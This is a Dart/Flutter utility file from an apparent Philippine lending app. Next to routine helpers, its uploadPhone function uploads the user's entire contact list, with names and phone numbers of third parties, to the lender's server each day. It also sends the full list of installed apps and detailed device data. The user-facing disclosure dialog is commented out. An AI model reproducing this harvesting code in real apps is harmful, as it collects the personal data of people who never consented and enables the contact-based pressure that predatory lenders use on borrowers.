import 'dart:convert';
import 'dart:io';

import 'package:app_info/app_info.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:device_information/device_information.dart';
import 'package:flutter/material.dart';
import 'package:memory_info/memory_info.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:philippines_loan/model/menu.dart';
import 'package:philippines_loan/service/config.dart';
import 'package:philippines_loan/service/http_request.dart';
import 'package:philippines_loan/utils/slog.dart';
import 'package:philippines_loan/utils/sp_data.dart';
import 'package:philippines_loan/utils/sp_key.dart';
import 'package:sprintf/sprintf.dart';

import 'expand_util.dart';
class Utils {}

String imgBaseUri = 'assets/images/%s.png';

String getImage(String name) {
  return sprintf(imgBaseUri, [name]);
}

// void startTo(
//   BuildContext context,
//   String routeName,
// {var isNewTask=false}
// ) {
//   if(isNewTask){
//     Navigator.of(context).pushNamedAndRemoveUntil(routeName, (Route<dynamic> route) => false);
//
//   }else{
//     Navigator.pushNamed(context, routeName);
//   }
//
//
// }

int currentTimeMillis() {
  return new DateTime.now().millisecondsSinceEpoch;
}

List<MenuItem> toMenus(List<String> stringArr, {int offset = 1}) {
  var menus = <MenuItem>[];
  for (int index = 0; index < stringArr.length; index++) {
    menus.add(MenuItem(index,index + offset, stringArr[index]));
  }
  return menus;
}

_openAddressBook() async {
  // 申请权限
  // Map<PermissionGroup, PermissionStatus> permissions = await PermissionHandler().requestPermissions([PermissionGroup.contacts]);
  //
  // // 申请结果
  // PermissionStatus permission = await PermissionHandler().checkPermissionStatus(PermissionGroup.contacts);
  // //granted表示申请成功
  // if (permission == PermissionStatus.granted){
  //
  // }
}

TextEditingController getCTL(String value) {
  return TextEditingController.fromValue(TextEditingValue(
      // 设置内容
      text: value,
      // 保持光标在最后
      selection: TextSelection.fromPosition(TextPosition(affinity: TextAffinity.downstream, offset: value.length))));
}

// 可以在utils定义log.dart
void printLog(Object message, StackTrace current) {
  MYCustomTrace programInfo = MYCustomTrace(current);
  print(
      "\n 文件: ${programInfo.fileName}, 行: ${programInfo.lineNumber}, 打印信息: $message \n");
}

class MYCustomTrace {
  final StackTrace _trace;
  String? fileName;
  int? lineNumber;
  int? columnNumber;

  MYCustomTrace(this._trace) {
    _parseTrace();
  }

  void _parseTrace() {
    var traceString = this._trace.toString().split("\n")[0];
    var indexOfFileName = traceString.indexOf(RegExp(r'[A-Za-z_]+.dart'));
    var fileInfo = traceString.substring(indexOfFileName);
    var listOfInfos = fileInfo.split(":");
    this.fileName = listOfInfos[0];
    this.lineNumber = int.parse(listOfInfos[1]);
    var columnStr = listOfInfos[2];
    columnStr = columnStr.replaceFirst(")", "");
    this.columnNumber = int.parse(columnStr);
  }
}

uploadInfo(BuildContext context) {
  isNeedUploadAB().then((isNeedUploadAB) {
    isNeedUploadDevice().then((isNeedUploadDevice) {

      slog.d("是否需要上传 $isNeedUploadAB   $isNeedUploadDevice ");
      if (isNeedUploadAB || isNeedUploadDevice) {
        // showPPDialog(context, () {
        //   //print("点击事件");
        //   Navigator.pop(context);
        //   uploadPhone(context);
        // }, () {
        //   context.startTo(NHomePage.routeName, isNewTask: true);
        // });
      }
    });
  });
}

Future<bool> isNeedUploadAB() async {
  // return true;

  var saveMillis = await sp_data.get(SPKey.ISPHONEUPLOAD.toString(), 0);

  return saveMillis == null || currentTimeMillis() - saveMillis > 86400000;
}

Future<bool> isNeedUploadDevice() async {

  // return true;

  var saveMillis = await sp_data.get(SPKey.DEVICEINFOUPLOAD.toString(), 0);

  return saveMillis == null || currentTimeMillis() - saveMillis > 86400000;
}

uploadPhone(BuildContext context) async {
  if (await Permission.contacts.request().isGranted) {
    if (await isNeedUploadAB()) {
      ContactsService.getContacts().then((contacts) {
        //print("手机通讯录  $contacts");
        sp_data.get(SPKey.UUID.toString(), "").then((uuid) {
          sp_data.get(SPKey.USERID.toString(), "").then((user_id) {
            sp_data.get(SPKey.PHONE.toString(), "").then((phone) {
              // //print("contacts  ${contacts.length}");
              var list = [];
              for (var value in contacts) {
                // //print("  contacts  value ${value}");
                if (value.phones != null && value.phones!.isNotEmpty) {
                  // list.add(NContacts(value.displayName,value.phones!.first.value,"0"));
                  list.add(<String, String?>{
                    "other_name": value.displayName,
                    "other_mobile": value.phones!.first.value,
                    "last_time": "0",
                  });
                }
              }
              var hashMap = <String, dynamic>{};
              hashMap["user_id"] = user_id;
              hashMap["uuid"] = uuid;
              hashMap["self_mobile"] = phone;
              hashMap["account_id"] = phone;
              hashMap["record"] = list;
              request(UriPath.addressbook, hashMap).then((result) {
                slog.d("通讯录上传返回数据   $result");
                if (result["code"] == "200") {
                  sp_data.put(
                      SPKey.ISPHONEUPLOAD.toString(), currentTimeMillis());
                } else {
                  toast(result["message"]);
                }
              });
            });
          });
        });
      });
    } else {
      slog.d("今天已经上传过电话信息  ");
    }

    //  上传APP信息

    if (await isNeedUploadDevice()) {
      var uuid = await sp_data.get(SPKey.UUID.toString(), "");
      var user_id = await sp_data.get(SPKey.USERID.toString(), "");
      var phone = await sp_data.get(SPKey.PHONE.toString(), "");
      final String currentTimeZone = DateTime.now().timeZoneName.toString();
      var memory = await MemoryInfoPlugin().memoryInfo;
      var diskSpace = await MemoryInfoPlugin().diskSpace;
      var queryData = MediaQuery.of(context);

      var open_time = await sp_data.get(SPKey.OPENTIME.toString(), "0");
      var open_power = await sp_data.get(SPKey.OPENPOWER.toString(), "0");
      var complete_apply_power =
          await sp_data.get(SPKey.COMPLETEAPPLYPOWER.toString(), "0");
      var appJson = "";
      var infoList = [];
      var appList = [];
      if (Platform.isAndroid) {
        var value = await AppInfo.getAPPs;

        if (value != null) {
          for (var app in value) {
            var map = Map<String, String>.from(app);
            appList.add(map);
          }
        }
        appJson = json.encode(appList);
      }
      ;

      var deviceModel = await DeviceInformation.deviceModel;
      var apiLevel = await DeviceInformation.apiLevel;
      var cpuName = await DeviceInformation.cpuName;
      var productName = await DeviceInformation.productName;
      var width = await queryData.size.width;
      var height = await queryData.size.height;
      var totalSpace = await diskSpace.totalSpace;
      var totalMem = await memory.totalMem;

      infoList.add(<String, dynamic>{
        "imei": uuid,
        "time_zone": currentTimeZone,
        "resolution": "$width x $height",
        "root": "0",
        "real_machine": "1",
        "screen": "0",
        "complete_apply_power": complete_apply_power,
        "back_num": "0",
        "open_power": open_power,
        "open_time": open_time,
        "mobile_model": deviceModel,
        "version": apiLevel,
        "cpu_model": cpuName,
        "hit_num": "0",
        "rom": "${totalSpace! ~/ 1000}",
        "brands": productName,
        "cpu_cores": "null",
        "ram": "${totalMem! ~/ 1000}",
        "applist": appJson,
      });

      var hashMap = <String, dynamic>{};
      hashMap["user_id"] = user_id;
      hashMap["uuid"] = uuid;
      hashMap["self_mobile"] = phone;
      hashMap["account_id"] = phone;
      hashMap["record"] = infoList;
      request(UriPath.device, hashMap).then((result) {
        slog.d("APP上传返回数据  $result");
        if (result["code"] == "200") {
          sp_data.put(SPKey.DEVICEINFOUPLOAD.toString(), currentTimeMillis());
        } else {
          toast(result["message"]);
        }
      });
    } else {
     slog.d("已经上传过APP信息");
    }
  }
}

Future<DateTime?> selectBirthday(BuildContext context) async {
  return await showDatePicker(
      context: context,
      initialDate: DateTime(1997),
      firstDate: DateTime(1940),
      lastDate: DateTime(2020),
      builder: (context, mc) {
        return Theme(data: ThemeData(primarySwatch: Colors.red), child: mc!);
      });
}